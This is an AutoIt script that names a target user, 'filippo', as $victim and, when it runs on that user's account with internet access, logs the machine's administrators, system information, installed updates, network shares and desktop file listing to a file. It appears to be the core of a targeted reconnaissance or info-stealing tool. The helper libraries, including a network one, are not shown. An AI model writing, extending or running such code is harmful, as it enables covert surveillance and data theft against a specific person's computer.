#include "libs/network.au3"
#include "libs/info.au3"
#include "libs/files.au3"
#include "libs/misc.au3"

$victim = "filippo"

if AmIusername($victim) Then

   if InternetCheck() Then

	  Log2File(administrators())

	  Log2File(systeminfo())

	  Log2File(updates_installed())

	  Log2File(shared())

	  Log2File(ListDesktopFiles())

   EndIf

EndIf